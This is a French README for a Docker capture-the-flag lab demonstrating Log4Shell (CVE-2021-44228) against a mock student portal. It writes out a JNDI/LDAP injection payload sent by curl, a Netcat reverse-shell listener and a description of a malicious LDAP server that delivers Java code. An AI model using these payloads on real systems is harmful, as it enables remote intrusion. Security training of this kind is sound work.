# Log4Shell-DIABLE 🐍

Ce projet est conçu pour démontrer et comprendre la vulnérabilité critique **Log4Shell** (CVE-2021-44228), qui affecte la bibliothèque **Apache Log4j 2**. Cette vulnérabilité permet à un attaquant d'exécuter du code arbitraire à distance en exploitant un mauvais traitement des messages de log.

## Présentation de l'application web

L'application web utilisée pour cette démonstration est un **portail étudiant** de l'**ISFA (Institut de Science Financière et d'Assurances)**. Ce portail permet aux étudiants de télécharger leurs documents scolaires et de consulter leurs notes. Dans cette démonstration, nous allons exploiter cette application pour démontrer la vulnérabilité Log4Shell.

## Prérequis

- **Docker** installé sur votre machine.

## Étapes d’installation et d’exploitation

### 1. Téléchargez les images Docker

Exécutez les commandes suivantes pour télécharger les images nécessaires depuis Docker Hub :

```
docker pull eddycaron/diable:log4shell_vuln_app
docker pull eddycaron/diable:log4shell_attacker
```

### 2. Créez un réseau Docker

Créez un réseau Docker pour que les conteneurs puissent communiquer entre eux :

```
docker network create --driver bridge --subnet 172.25.0.0/16 net1
```

### 3. Lancez l’application vulnérable

### Sur Linux :

```
docker run -d --name vuln_app --network net1 --ip 172.25.0.10 eddycaron/diable:log4shell_vuln_app
```

Accédez à l’application vulnérable via :

```
http://172.25.0.10:8080
```

### Sur Windows :

```
docker run -d --name vuln_app -p 8080:8080 --network net1 --ip 172.25.0.10 eddycaron/diable:log4shell_vuln_app
```

Accédez à l’application vulnérable via :

```
http://localhost:8080
```

### 4. Lancez l’attaquant

Exécutez le conteneur de l’attaquant :

```
docker run -d --name attacker --network net1 --ip 172.25.0.20 eddycaron/diable:log4shell_attacker
```

### 5. Exploitez la vulnérabilité

### Initialisez l’environnement de l’attaquant

Connectez-vous au conteneur de l’attaquant et lancez le script d’exploitation :

```
docker exec -it attacker bash
python3 exploit.py --userip 172.25.0.20 --webport 8000 --lport 9001
```

### Configurez un listener

Dans le conteneur de l’attaquant, lancez un listener avec Netcat :

```
docker exec -it attacker bash
nc -lvnp 9001
```

### Envoyez une requête malveillante

Envoyez une requête POST malveillante à l’application vulnérable :

```
docker exec -it attacker bash
curl -X POST -d "uname=\${jndi:ldap://172.25.0.20:1389/a}&password=wrongpassword" http://172.25.0.10:8080/login
```

### 6. Observez le résultat

Dans le listener Netcat, vous recevrez une connexion depuis le serveur cible. Voici quelques commandes pour interagir avec le système compromis :

- **Afficher l'utilisateur actuel** :
    
    ```bash
    whoami
    ```
    
- **Afficher le répertoire de travail actuel** :
    
    ```bash
    pwd
    ```
    
- **Trouver le flag caché** :
    
    Explorez les répertoires Linux pour trouver le flag caché.
    

### Indice :

Le flag est situé dans le répertoire contenant les utilisateurs de la machine. 😉

## Fonctionnement de `exploit.py`

Le fichier `exploit.py` agit comme un serveur LDAP malveillant. Voici ce qu'il fait :

1. Il écoute sur un port défini (par défaut, 8000) pour capturer les requêtes envoyées par l'application vulnérable.
2. Lorsque l’exploit est injectée dans l'application, elle déclenche une requête LDAP vers le serveur malveillant.
3. Le script envoie une réponse contenant un objet Java malveillant, ce qui exécute du code arbitraire sur le serveur ciblé.
4. Cette interaction permet d'établir une connexion avec le listener Netcat, établissant ainsi un accès non autorisé.

## Avertissement

**L'utilisation de ce projet pour exploiter des systèmes sans autorisation est strictement interdite.** Assurez-vous de toujours avoir les droits nécessaires avant d'utiliser des outils de sécurité offensive.
